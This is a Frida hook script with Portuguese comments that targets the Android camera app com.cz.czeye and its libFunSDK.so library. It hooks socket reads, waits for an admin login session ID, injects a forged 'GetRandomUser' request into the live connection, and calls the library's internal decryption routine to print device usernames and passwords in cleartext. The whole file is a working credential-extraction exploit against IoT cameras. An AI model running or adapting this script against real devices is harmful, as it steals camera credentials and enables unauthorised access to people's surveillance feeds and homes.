// emu_hook.js — roda via: frida -U -n com.cz.czeye -l emu_hook.js
// Ao abrir uma câmera (login admin), injeta GetRandomUser e decifra o Info na
// hora com Fun_DecDevRandomUserInfo -> user/senha em claro (no console).
(function () {
  var LIB = "libFunSDK.so";
  var SNS = ["SN_CAMERA_1", "SN_CAMERA_2", "SN_CAMERA_3"];
  var done = {}, decd = {};
  var sendFn = null, decFn = null;
  try {
    sendFn = new NativeFunction(Module.findExportByName("libc.so", "send") || Module.findExportByName(null, "send"), "int", ["int", "pointer", "size_t", "int"]);
    decFn = new NativeFunction(Module.findExportByName(LIB, "_Z24Fun_DecDevRandomUserInfoPKcS0_Pc"), "int", ["pointer", "pointer", "pointer"]);
    console.log("[emu] send+dec OK");
  } catch (e) { console.log("[emu] ERRO init: " + e); }

  function frame(json, sid, msgid, seq) {
    var body = []; for (var i = 0; i < json.length; i++) body.push(json.charCodeAt(i) & 0xff); body.push(0);
    var n = body.length;
    var h = [0xFF,1,0,0, sid&0xff,(sid>>8)&0xff,(sid>>16)&0xff,(sid>>24)&0xff, seq&0xff,(seq>>8)&0xff,(seq>>16)&0xff,(seq>>24)&0xff,0,0, msgid&0xff,(msgid>>8)&0xff, n&0xff,(n>>8)&0xff,(n>>16)&0xff,(n>>24)&0xff];
    var all = h.concat(body); var buf = Memory.alloc(all.length); buf.writeByteArray(all); return { ptr: buf, len: all.length };
  }
  function scan(buf, n) { try { var b = buf.readByteArray(n); if (!b) return null; var u = new Uint8Array(b), s = ""; for (var i = 0; i < u.length; i++) s += String.fromCharCode(u[i]); return s; } catch (e) { return null; } }
  function decrypt(info) {
    SNS.forEach(function (sn) {
      try { var out = Memory.alloc(512); out.writeByteArray(new Array(512).fill(0));
        var r = decFn(Memory.allocUtf8String(sn), Memory.allocUtf8String(info), out);
        var s = null; try { s = out.readUtf8String(); } catch (e) {}
        if (r === 0 && s && /p1:|p2:/.test(s)) console.log("[emu] CREDS SN=" + sn + "  " + s);
      } catch (e) {}
    });
  }
  function onRead(fd, buf, n) {
    if (n < 20 || n > 65536) return;
    try { if (buf.readU8() !== 0xFF) return; } catch (e) { return; }
    var s = scan(buf, n); if (!s) return;
    if (s.indexOf("AliveInterval") >= 0 && s.indexOf("SessionID") >= 0 && !done[fd]) {
      var m = s.match(/"SessionID"\s*:\s*"?(0x[0-9a-fA-F]+)"?/);
      if (m && sendFn) { done[fd] = 1; var sidNum = parseInt(m[1], 16);
        var f = frame('{"Name":"GetRandomUser","SessionID":"' + m[1] + '"}', sidNum, 1660, 600);
        console.log("[emu] login admin fd=" + fd + " SID=" + m[1] + " -> inject ret=" + sendFn(fd, f.ptr, f.len, 0));
      }
    }
    var mi = s.match(/"Info"\s*:\s*"([A-Za-z0-9+/=]+)"/);
    if (mi && !decd[mi[1]]) { decd[mi[1]] = 1; console.log("[emu] INFO " + mi[1]); decrypt(mi[1]); }
  }
  Interceptor.attach(Module.findExportByName("libc.so", "read") || Module.findExportByName(null, "read"), {
    onEnter: function (a) { this.fd = a[0].toInt32(); this.buf = a[1]; },
    onLeave: function (r) { onRead(this.fd, this.buf, r.toInt32()); }
  });
  console.log("[emu] ARMED — abra f5332/9a07");
})();
